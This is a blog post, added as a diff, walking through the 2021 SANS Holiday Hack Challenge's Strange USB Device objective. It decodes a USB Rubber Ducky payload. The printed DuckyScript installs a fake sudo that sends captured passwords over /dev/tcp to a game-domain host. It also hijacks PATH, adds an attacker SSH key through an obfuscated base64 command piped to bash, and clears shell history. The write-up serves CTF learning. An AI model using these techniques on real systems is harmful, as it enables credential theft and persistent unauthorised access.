@@ -1,0 +1,139 @@
+---
+title:  "Objective 5: Strange USB Device - 2021 SANS Holiday Hack Challenge"
+date:   "2022-01-05 00:05:00 -0800"
+categories: HolidayHack2021
+header:
+ teaser: /assets/images/HolidayHack2021/kringlecon_2021_pic.jpg
+---
+
+In this challenge, we do some light reverse-engineering on a USB Rubber Ducky.
+
+[Play the 2021 SANS Holiday Hack Challenge](https://2021.kringlecon.com/invite)
+
+
+## Objective
+Assist the elves in reverse engineering the strange USB device.
+
+> A random USB device, oh what could be the matter?
+> It seems a troll has left this, right on a silver platter.
+> Oh my friend I need your ken, this does not smell of attar.
+> Help solve this challenge quick quick, I shall offer no more natter.
+> 
+> Evaluate the USB data in /mnt/USBDEVICE.
+
+The top of the terminal asks for the username of the troll involved with this attack.
+
+There's also talk on this that's pretty critical: [HIDden Ducky, Deconstructed Payload](https://www.youtube.com/watch?v=tkAYncGF-zw&ab_channel=KringleCon)
+
+## The Challenge
+
+Basically, the summary of the talk is that there's a language that USB rubber duckies use for scripting called DuckyScript. This script then gets encoded to a binary (called inject.bin) and placed on an SD card in the rubber ducky.
+
+The presenter, Kevin Tyers, has created a python script called [Mallard](https://github.com/dagonis/Mallard) that can decode these inject.bin files.
+
+Running "ls -la" from the home directory reveals that this script is already pre-loaded.
+
+First, let's just check out that "/mnt/USBDEVICE" directory:
+
+```bash
+cd /mnt/USBDEVICE
+ls -la
+```
+this gives us:
+```txt
+total 12
+drwxr-xr-x 1 root root 4096 Dec  3 16:25 ./
+drwxr-xr-x 1 root root 4096 Dec  3 16:25 ../
+-rw-r--r-- 1 root root 2090 Nov 30 22:14 inject.bin
+```
+
+So that inject.bin is in there (where we would expect it to be).
+
+Let's head back to the home directory and call that mallard script.
+
+```bash
+cd ~
+python3 mallard.py --file /mnt/USBDEVICE/inject.bin
+```
+
+This spits out the DuckyScript for the file.
+
+```
+ENTER
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+STRING /bin/bash
+ENTER
+DELAY 500
+STRING mkdir -p ~/.config/sudo
+ENTER
+DELAY 200
+STRING echo '#!/bin/bash > ~/.config/sudo/sudo
+ENTER
+STRING /usr/bin/sudo $@
+ENTER
+STRING echo -n "[sudo] password for $USER: "
+ENTER
+STRING read -s pwd
+ENTER
+STRING echo
+ENTER
+STRING echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
+ENTER
+STRING if [ $? -eq 1 ]
+ENTER
+STRING then
+ENTER
+STRING echo "$USER:$pwd:invalid" > /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo "Sorry, try again."
+ENTER
+STRING sudo $@
+ENTER
+STRING else
+ENTER
+STRING echo "$USER:$pwd:valid" > /dev/tcp/trollfun.jackfrosttower.com/1337
+ENTER
+STRING echo "$pwd" | /usr/bin/sudo -S $@
+ENTER
+STRING fi
+ENTER
+STRING fi' > ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING chmod u+x ~/.config/sudo/sudo
+ENTER
+DELAY 200
+STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
+ENTER
+DELAY 200
+STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
+ENTER
+DELAY 200
+STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
+ENTER
+DELAY 600
+STRING history -c && rm .bash_history && exit
+ENTER
+DELAY 600
+GUI q
+```
+
+There's no apparent username, but that giant base64 string does look pretty suspicious. Putting this command (without the `| bash`) into our own terminal outputs the following:
+
+```bash
+echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
+```
+
+Looks like we have an SSH key here. The username for it is ickymcgoop.
+
+**Answer:** ickymcgoop
